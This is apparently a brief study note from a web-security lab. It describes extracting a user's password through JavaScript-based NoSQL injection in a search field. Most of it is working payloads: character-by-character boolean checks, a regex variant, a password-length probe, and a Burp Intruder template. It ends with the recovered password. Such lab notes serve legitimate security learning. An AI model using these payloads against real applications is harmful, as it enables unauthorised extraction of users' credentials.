in a searching system of users extracting data can occur using commands like this:

admin' && this.password[0] == 'a' || 'a'=='b

This returns the first character of the user's password string, 
enabling you to extract the password character by character.

You can also use the javascript match() function:
admin' && this.password.match(/\d/) || 'a'=='b

check the length of the password of the admin user
administrator' && this.password.length < 30 || 'a'=='b

until given back a different response

eventually getting 8 as the length

use this then in itruder:
administrator'+%26%26+this.password[ยง0ยง]+%3d%3d+'ยงpยง'+||+'a'%3d%3d'b

this gives the password of:
pzukuhuh
